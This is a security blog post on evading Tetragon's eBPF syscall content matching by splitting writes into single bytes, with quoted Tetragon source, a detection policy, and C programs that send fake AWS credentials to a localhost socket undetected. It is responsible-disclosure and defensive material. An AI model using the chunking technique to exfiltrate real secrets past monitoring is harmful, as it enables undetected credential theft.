---
title: "Smuggling Secrets Past Tetragon, One Byte at a Time"
dateString: 13th October 2026
draft: false
tags: ["Security", "eBPF", "Tetragon", "Detection Evasion", "Linux"]
weight: 101
cover:
  image: ""
---

Now that my talks at the Linux Security Summit and the Open Source Summit are done, I finally have time to write this one up and share it with you.

I spend a lot of time looking at how runtime security tools watch the kernel. Tetragon is one of the good ones, so I wanted to understand exactly how far its content matching goes. While reading the code I found a simple way to make its rules miss data they are set up to catch. You take one write and split it into many tiny writes. The data still lands where it was going. Tetragon just never sees enough of it at once to match.

I want to be clear about what this is before we start. It is not a vulnerability. There is no CVE and there is no patch. I reported it to the Cilium security team, they looked at it, they confirmed it works, and they told me it is expected behavior for the way Tetragon evaluates syscalls. They also said it was fair to open a public issue about it as a feature request. So this post is not a takedown of Tetragon. It is me walking through a real limit in how syscall content matching works, why that limit exists on purpose, and what it means if you lean on this feature to catch secrets leaving a machine.

## What the feature is meant to do

Tetragon hooks kernel functions, mostly with kprobes, and can check the arguments of the call it is watching against a rule you write. Some syscalls take a buffer plus a separate length. The obvious one is write, which looks like `write(int fd, const void *buf, size_t count)`. For a case like that, you tell Tetragon the argument is a `char_buf`, and you point it at the argument that holds the length using `sizeArgIndex`.

Put that together with an operator like `SubString`, `Prefix`, `Postfix`, or `Equal`, and you have the thing people use to catch secrets on their way out of a host. AWS keys, private keys, tokens, anything written to a socket or a file where it should not go. Here is a policy like that, based on `examples/tracingpolicy/write.yaml` in the repo:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-aws-key-exfil"
spec:
  kprobes:
  - call: "sys_write"
    syscall: true
    args:
    - index: 0
      type: "int"
    - index: 1
      type: "char_buf"
      sizeArgIndex: 3
    - index: 2
      type: "size_t"
    selectors:
    - matchArgs:
      - index: 1
        operator: "SubString"
        values:
        - "AWS_SECRET_ACCESS_KEY"
```

This hooks every write, reads the buffer at index 1 using the length at index 3, and checks whether that buffer contains `AWS_SECRET_ACCESS_KEY`. If a process writes that string to any file descriptor, the rule fires.

## Where the length actually comes from

The whole thing turns on one detail. The number of bytes Tetragon reads and matches against is not a fixed size, and it is not something Tetragon measures for itself. It is read straight out of the syscall arguments that the calling process handed to the kernel, through `sizeArgIndex`. The process that is writing the data decides how much Tetragon looks at.

Here is the path through the code. I checked all of this against the current tree, and the line numbers below are from that checkout, so if you are reading a different version confirm them yourself.

`get_arg_meta` in `bpf/process/types/basic.h:562` turns the `sizeArgIndex` you set into one of the raw argument registers saved for the event:

```c
FUNC_INLINE unsigned long get_arg_meta(int meta, struct msg_generic_kprobe *e)
{
	switch (meta & ARGM_INDEX_MASK) {
	case 1:
		return e->a0;
	case 2:
		return e->a1;
	case 3:
		return e->a2;
	case 4:
		return e->a3;
	case 5:
		return e->a4;
	}
	return 0;
}
```

For `write(fd, buf, count)` with `sizeArgIndex: 3` this returns `e->a2`, which is `count` exactly as the process passed it. Nothing checks it against anything. It is just the register value.

`__copy_char_buf` in `bpf/process/generic_calls.h:93` takes that value as `bytes` and copies that many bytes, capped at 4095 on this path, from the buffer into the event:

```c
FUNC_INLINE long
__copy_char_buf(void *ctx, long off, unsigned long arg, unsigned long bytes,
		bool max_data, struct msg_generic_kprobe *e)
{
	...
	/* Bound bytes <4095 to ensure bytes does not read past end of buffer */
	rd_bytes = bytes < 0x1000 ? bytes : 0xfff;
	asm volatile("%[rd_bytes] &= 0xfff;\n"
		     : [rd_bytes] "+r"(rd_bytes));
	err = probe_read(&s[2], rd_bytes, (char *)arg);
	if (err < 0)
		return return_error(s, char_buf_pagefault);
	s[0] = (int)bytes;
	s[1] = (int)rd_bytes;
	return rd_bytes + extra;
}
```

The line that matters is `s[0] = (int)bytes`. The byte count for this one call is stored right next to the copied data, and that stored count is what feeds matching. Not something worked out from earlier calls. Not something worked out from later calls. Just this call.

`filter_char_buf` in `bpf/process/types/basic.h:1024` reads that count back and passes it, with the copied buffer, to the matcher:

```c
FUNC_LOCAL long
filter_char_buf(struct selector_arg_filter *filter, char *args, int value_off)
{
	// Arg length is 4 bytes before the value data.
	uint len = *(uint *)&args[value_off - 4];

	return filter_char_buf_value(filter, &args[value_off], len);
}
```

`filter_char_buf_value` in `bpf/process/types/basic.h:990` picks the operator, always against that same per call length and buffer:

```c
FUNC_LOCAL long
filter_char_buf_value(struct selector_arg_filter *filter, char *arg_str, uint len)
{
	long match = 0;

	switch (filter->op) {
	case op_substring_igncase:
		if (bpf_ksym_exists(bpf_strncasestr))
			match = filter_char_substring(filter, arg_str, len, true);
		break;
	case op_substring:
		if (bpf_ksym_exists(bpf_strnstr))
			match = filter_char_substring(filter, arg_str, len, false);
		break;
	case op_filter_eq:
	case op_filter_neq:
		match = filter_char_buf_equal(filter, arg_str, len);
		break;
	case op_filter_str_prefix:
	case op_filter_str_notprefix:
		match = filter_char_buf_prefix(filter, arg_str, len);
		break;
	case op_filter_str_postfix:
	case op_filter_str_notpostfix:
		match = filter_char_buf_postfix(filter, arg_str, len);
		break;
	}

	return is_not_operator(filter->op) ? !match : match;
}
```

The prefix and postfix matchers at `basic.h:758` and `basic.h:861` each build a lookup key sized to that per call length. The substring path at `basic.h:947` walks your list of substrings and calls `bpf_strnstr` or `bpf_strncasestr`, bounded by the same length. Note those two substring kfuncs only exist on kernels that export them, which is why the code guards them with `bpf_ksym_exists`, and that whole path is only built under `__LARGE_BPF_PROG`.

Every one of these looks at a single call worth of data. There is no map, no running buffer per file descriptor or per connection, that carries bytes or partial match state from one write into the next. Once you see that, the trick writes itself.

## The trick: chop up the write

If matching only ever sees one call at a time, then a payload spread across enough calls, each too small to hold the string you are looking for, never trips the rule. Meanwhile whatever the file descriptor points at still gets the full payload, because the kernel does not care how many writes it took to deliver it.

Two small C programs show it. Both send the same 78 bytes of fake AWS credentials to a socket. The only difference is how many writes they use.

Program A sends it in one write, and Tetragon matches:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
    const char *payload =
        "AWS_ACCESS_KEY_ID=AKIAFAKEKEY1234567890\n"
        "AWS_SECRET_ACCESS_KEY=wJalrFAKESECRETkeyEXAMPLEbPxRfiCYEXAMPLEKEY\n";

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(4444) };
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    ssize_t n = write(fd, payload, strlen(payload));   // one call, whole buffer
    fprintf(stderr, "sent %zd bytes in 1 write()\n", n);
    close(fd);
    return 0;
}
```

Program B sends the same bytes one at a time, and Tetragon never matches:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
    const char *payload =
        "AWS_ACCESS_KEY_ID=AKIAFAKEKEY1234567890\n"
        "AWS_SECRET_ACCESS_KEY=wJalrFAKESECRETkeyEXAMPLEbPxRfiCYEXAMPLEKEY\n";
    size_t len = strlen(payload);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(4444) };
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    size_t sent = 0, calls = 0;
    for (size_t i = 0; i < len; i++) {
        ssize_t w = write(fd, payload + i, 1);          // one call per byte
        if (w == 1) { sent++; calls++; }
    }
    fprintf(stderr, "sent %zu bytes in %zu write()s\n", sent, calls);
    close(fd);
    return 0;
}
```

Load the policy from earlier, start a listener on `127.0.0.1:4444`, and run both.

Program A: the listener gets the full payload in one read. Tetragon fires, the policy counter goes up, and the event carries the matched buffer.

Program B: the listener gets the exact same 78 bytes, because TCP puts them back together on the other side. The theft works just as well. Tetragon does not move. Each write carried one byte, and matching a 21 character string against a one byte buffer cannot work, and there is no later step where those bytes are ever looked at together.

You do not even need one byte per write. Any split that keeps the string you are hunting from sitting whole inside a single call does the job. Two writes that cut the string somewhere in the middle are enough. One byte at a time is just the version that always works, no matter what the string is or where it sits.

One more thing worth saying plainly, since people ask. This has nothing to do with AWS keys. I used that string because it is a realistic thing to steal. The matcher does not care what the string is. It compares whatever you configured against one call worth of data. Swap in a private key block, a token, a filename for a `Prefix` rule, any `Equal` value, and the same chopping defeats it. The only thing that changes is how small the chunks need to be for that particular string.

## Why this counts as expected behavior

It is tempting to say Tetragon should just remember the last chunk of bytes per file descriptor and check across the boundary. Here is why that is harder than it sounds, and why I think the Cilium team calling this expected behavior is a fair answer and not a brush off.

Keeping state means keeping a running buffer, and you have to key it on something that does not lie to you. A file descriptor number is not enough on its own. Numbers get reused the moment a descriptor is closed, and a dup'd descriptor points at the same open file under a different number. To do it right you need the underlying file or socket identity. That is a real map entry, with a policy for when to throw entries away, sized for every descriptor across every process Tetragon watches that has a matching rule loaded. Tetragon is a kprobe tool with no built in idea of a stream or a connection. Asking it to hold that much state for a feature whose only job is "does this string appear" is a lot.

The verifier makes it harder still. The code that already exists here carries comments about fighting the verifier. The substring loop has to mask its own index by hand because the verifier does not keep the loop bound when the index is used for pointer math. Reassembling across an open ended number of past calls makes that much worse. You would need a fixed size window, a rule for what to drop when memory gets tight, and matching that still works when the string lands right on the edge of a window you cannot grow.

And cost adds up. When a policy asks for it, Tetragon hooks write across the whole system. Every extra lookup and every extra byte held per call is paid on a hot path, for every write by every traced process, whether or not that process ever goes near the pattern. Keeping the check local to the one call you are looking at is the cheaper and safer default. The cost of doing more is not small just because the evasion is easy.

None of that makes the limit unimportant. It makes it a tradeoff, which is exactly how the team described it back to me.

## How the disclosure went

I reported it to security@cilium.io, following the process in the repo's `SECURITY.md`.

The Cilium security team got back to me quickly and actually engaged with the detail. They asked real questions about the code path instead of closing it out. After they reviewed it, they told me it is expected behavior for Tetragon's per call model rather than a defect, and they said it was fine to open a public issue as a feature request so the gap can keep being tracked in the open.

I will say why I was happy with how they handled it. They did not just close the report. They treated "does this work" and "should we change it" as two different questions, said yes to the first, said "not now, and here is the reasoning" to the second, and pointed me at the right place to keep asking the second one. That is what you want from a security contact, whether or not the answer ends in a CVE.

## If you want to close the gap

None of these are the one true fix. They are a range of options with different costs, and I would rather lay them out honestly than pick one and pretend it is done.

The cheapest is a behavior check. Count writes per process and descriptor over a short window and flag a process doing a strange number of tiny writes to the same place. That catches the obvious version, the one byte at a time case, for almost nothing. It does not catch an attacker who paces medium sized chunks to look like normal buffered writing, which is what anyone would switch to once this is known.

The real fix is stateful reassembly. Key the state on socket or inode identity, not the descriptor number, keep a bounded buffer, and run the same matchers against the rebuilt stream instead of the single call. This actually closes the gap. It is also the expensive one I described above, with a new map, an eviction policy, verifier safe loops over the rebuilt data, and real cost on every write.

Above that is matching at the stream level. Move content matching to a place that already thinks in streams instead of syscalls, like sockops or a TC based path that sees rebuilt TCP payloads. That is less a tweak to matchArgs and more a second detection surface with its own rules. Worth it if payload content detection really matters to you, but it is a project, not a patch.

And there is a ceiling no fix removes. Content matching only ever sees what is in the buffer in the clear. Base64, gzip, a quick XOR with a fixed key, or real TLS before the data reaches a syscall Tetragon can watch all beat substring matching no matter how well you rebuild the stream, because at that point the bytes on the wire no longer look like the secret. That is not a Tetragon thing. That is the ceiling on matching syscall content at all.

## What to take away

If you are using `char_buf` with `SubString`, `Prefix`, `Postfix`, or `Equal` to catch secrets leaving a host, know what it really is. It is a best effort tripwire that catches credentials leaving in the clear, in one write, with no obfuscation. It is not a data loss prevention boundary, and it should not be the only thing between a compromised host and a stolen secret. Treat it as one signal next to others: egress controls on the network, secret scanning at rest, credentials that expire fast so a leak is worth less, and behavior detections on the process itself. Tetragon calling this expected behavior is an honest description of what the feature is. The useful move for you is making sure nothing downstream quietly treats it as more than that.
